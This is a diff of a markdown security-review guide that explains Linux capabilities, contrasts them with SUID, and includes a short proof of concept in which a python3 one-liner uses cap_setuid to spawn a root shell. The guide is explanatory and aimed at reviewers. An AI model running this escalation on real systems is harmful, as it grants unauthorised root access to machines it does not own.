@@ -21,7 +21,6 @@ Historically, Linux privilege was binary:
 **The Solution (Capabilities):**
 The kernel breaks the power of Root into distinct, small slices called **Capabilities**. You can grant a binary *just* the specific power it needs without granting full UID 0 status.
 
----
 
 ## 2. Why this matters for Security Reviews
 Admins often view Capabilities as a "hardening" measure. They might remove the SUID bit from a binary to make it "safe," but then assign it a Capability that is effectively just as dangerous.
@@ -58,22 +57,27 @@ Critical/Malicious:Plaintext/usr/bin/python3.8 = cap_setuid+ep
 
 ##  5. Exploit Case Study (Proof of Concept)
 If you find python3 has the cap_setuid capability, here is how a regular user escalates to root:
-# 1. Verify the capability
+
+**1. Verify the capability**
 ```bash
 getcap /usr/bin/python3
 ```
-# Output: 
+
+# Output:
+
 ```bash
 /usr/bin/python3 = cap_setuid+ep
 ```
 
-# 2. Execute the exploit
-```bash
-python3 -c 'import os; os.setuid(0); os.system("/bin/sh")' 
+**2. Execute the exploit**
+
+```bash 
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
 
-# 3. Result
-# You are dropped into a root shell (#)
+**3. Result**
+
+You are dropped into a root shell (#)
 
 ## 6. Comparison: SUID vs. Capabilities
 Feature SUID Capabilities Visibility High (ls -l, red highlight)Hidden (Requires getcap)GranularityAll or Nothing (Full Root)Specific Powers (Network, File, UID)ScopeAffects the whole processSpecific threads/processesReview StrategyCheck for s bitCheck for cap_setuid, cap_dac_override
